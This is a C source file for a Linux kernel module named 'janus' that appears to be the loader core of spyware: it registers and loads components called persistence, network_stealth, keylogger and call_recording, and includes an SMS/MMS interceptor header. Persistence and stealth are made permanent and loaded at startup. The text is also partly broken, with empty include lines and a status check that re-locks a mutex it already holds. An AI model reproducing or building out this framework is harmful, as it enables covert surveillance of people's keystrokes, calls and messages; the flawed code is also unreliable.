#include ""
#include ""
#include ""
#include "sms_mms_interceptor.h"
#include "wallpaper_changer.h"
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/mutex.h>
#include <linux/list.h>
#include <linux/string.h>
#include <linux/vmalloc.h>
#include <linux/delay.h>

#define MAX_MODULES 15
#define MODULE_LOAD_TIMEOUT_MS 5000

typedef int (*module_func)(void);

struct janus_module {
    char name[64];
    module_func load;
    module_func unload;
    module_func status;
    int priority;
    int permanent;
    int loaded;
    int load_attempts;
    unsigned long last_load_attempt;
    struct list_head list;
};

static LIST_HEAD(module_list);
static int active_modules = 0;
static DEFINE_MUTEX(module_mutex);

extern int live_call_recording_load(void);
extern int live_call_recording_unload(void);
extern int live_call_recording_status(void);
extern int network_stealth_load(void);
extern int network_stealth_unload(void);
extern int network_stealth_status(void);
extern int keylogger_load(void);
extern int keylogger_unload(void);
extern int keylogger_status(void);
extern int persistence_load(void);
extern int persistence_unload(void);
extern int persistence_status(void);

static int core_load(void) { return 0; }
static int core_unload(void) { return 0; }
static int core_status(void) { return 1; }

static int validate_module_func(module_func func) {
    return (func != NULL);
}

static struct janus_module *create_core_module(void) {
    struct janus_module *core = kzalloc(sizeof(struct janus_module), GFP_KERNEL);
    if (!core) return NULL;
    
    strscpy(core->name, "core", sizeof(core->name));
    core->load = core_load;
    core->unload = core_unload;
    core->status = core_status;
    core->priority = 0;
    core->permanent = 1;
    core->loaded = 1;
    
    return core;
}

static void register_core_module(void) {
    struct janus_module *core = create_core_module();
    if (!core) return;
    
    mutex_lock(&module_mutex);
    list_add_tail(&core->list, &module_list);
    active_modules++;
    mutex_unlock(&module_mutex);
}

static struct janus_module *find_module(const char *name) {
    struct janus_module *mod;
    list_for_each_entry(mod, &module_list, list) {
        if (strcmp(mod->name, name) == 0) {
            return mod;
        }
    }
    return NULL;
}

static int can_attempt_load(struct janus_module *mod) {
    unsigned long now = jiffies;
    unsigned long elapsed = jiffies_to_msecs(now - mod->last_load_attempt);
    
    if (mod->load_attempts >= 3 && elapsed < 30000) {
        return 0;
    }
    
    if (mod->load_attempts >= 5) {
        return 0;
    }
    
    return 1;
}

static void cleanup_failed_module(struct janus_module *mod) {
    if (mod->loaded && mod->unload) {
        mod->unload();
    }
    mod->loaded = 0;
}

int janus_register_module(const char *name, module_func load, 
                         module_func unload, module_func status, 
                         int priority, int permanent) {
    struct janus_module *new_mod, *mod;
    struct list_head *pos;
    
    if (active_modules >= MAX_MODULES) return -EBUSY;
    if (!validate_module_func(load) || !validate_module_func(unload) || !validate_module_func(status)) {
        return -EINVAL;
    }
    
    new_mod = kzalloc(sizeof(struct janus_module), GFP_KERNEL);
    if (!new_mod) return -ENOMEM;
    
    strscpy(new_mod->name, name, sizeof(new_mod->name));
    new_mod->load = load;
    new_mod->unload = unload;
    new_mod->status = status;
    new_mod->priority = priority;
    new_mod->permanent = permanent;
    new_mod->loaded = 0;
    new_mod->load_attempts = 0;
    new_mod->last_load_attempt = 0;
    
    mutex_lock(&module_mutex);
    
    list_for_each(pos, &module_list) {
        mod = list_entry(pos, struct janus_module, list);
        if (mod->priority < new_mod->priority) {
            list_add_tail(&new_mod->list, pos);
            active_modules++;
            mutex_unlock(&module_mutex);
            return 0;
        }
    }
    
    list_add_tail(&new_mod->list, &module_list);
    active_modules++;
    mutex_unlock(&module_mutex);
    return 0;
}

int janus_unregister_module(const char *name) {
    struct janus_module *mod;
    
    mutex_lock(&module_mutex);
    mod = find_module(name);
    if (!mod) {
        mutex_unlock(&module_mutex);
        return -ENOENT;
    }
    
    if (mod->loaded && mod->unload) {
        mod->unload();
    }
    
    list_del(&mod->list);
    kfree(mod);
    active_modules--;
    mutex_unlock(&module_mutex);
    return 0;
}

int janus_load_module(const char *name) {
    struct janus_module *mod;
    int ret = 0;
    unsigned long timeout;
    
    mutex_lock(&module_mutex);
    mod = find_module(name);
    if (!mod) {
        mutex_unlock(&module_mutex);
        return -ENOENT;
    }
    
    if (!can_attempt_load(mod)) {
        mutex_unlock(&module_mutex);
        return -EAGAIN;
    }
    
    mod->last_load_attempt = jiffies;
    mod->load_attempts++;
    
    if (mod->load && !mod->loaded) {
        timeout = jiffies + msecs_to_jiffies(MODULE_LOAD_TIMEOUT_MS);
        
        mutex_unlock(&module_mutex);
        ret = mod->load();
        mutex_lock(&module_mutex);
        
        if (time_after(jiffies, timeout)) {
            ret = -ETIMEDOUT;
        }
        
        if (ret == 0) {
            mod->loaded = 1;
            mod->load_attempts = 0;
        } else {
            cleanup_failed_module(mod);
        }
    }
    mutex_unlock(&module_mutex);
    return ret;
}

int janus_unload_module(const char *name) {
    struct janus_module *mod;
    int ret = 0;
    
    mutex_lock(&module_mutex);
    mod = find_module(name);
    if (!mod) {
        mutex_unlock(&module_mutex);
        return -ENOENT;
    }
    
    if (mod->unload && mod->loaded && !mod->permanent) {
        ret = mod->unload();
        if (ret == 0) {
            mod->loaded = 0;
            mod->load_attempts = 0;
        }
    }
    mutex_unlock(&module_mutex);
    return ret;
}

void janus_check_modules(void) {
    struct janus_module *mod;
    
    mutex_lock(&module_mutex);
    list_for_each_entry(mod, &module_list, list) {
        if (mod->status && mod->loaded) {
            int status = mod->status();
            if (status < 0) {
                if (!mod->permanent) {
                    janus_unload_module(mod->name);
                }
            } else if (status == 0 && !mod->permanent) {
                janus_unload_module(mod->name);
            }
        }
    }
    mutex_unlock(&module_mutex);
}

static void cleanup_all_modules(void) {
    struct janus_module *mod, *tmp;
    
    mutex_lock(&module_mutex);
    list_for_each_entry_safe(mod, tmp, &module_list, list) {
        if (mod->unload && mod->loaded) {
            mod->unload();
        }
        list_del(&mod->list);
        kfree(mod);
        active_modules--;
    }
    mutex_unlock(&module_mutex);
}

static int __init janus_init(void) {
    int ret;
    
    register_core_module();
    
    ret = janus_register_module("persistence", persistence_load,
                               persistence_unload, persistence_status, 10, 1);
    if (ret) return ret;
    
    ret = janus_register_module("network_stealth", network_stealth_load,
                               network_stealth_unload, network_stealth_status, 5, 1);
    if (ret) goto err_cleanup;
    
    ret = janus_register_module("keylogger", keylogger_load,
                               keylogger_unload, keylogger_status, 3, 0);
    if (ret) goto err_cleanup;
    
    ret = janus_register_module("call_recording", live_call_recording_load,
                               live_call_recording_unload, live_call_recording_status, 2, 0);
    if (ret) goto err_cleanup;
    
    ret = janus_load_module("persistence");
    if (ret) goto err_cleanup;
    
    ret = janus_load_module("network_stealth");
    if (ret) goto err_cleanup;
    
    return 0;

err_cleanup:
    cleanup_all_modules();
    return ret;
}

static void __exit janus_exit(void) {
    cleanup_all_modules();
}

module_init(janus_init);
module_exit(janus_exit);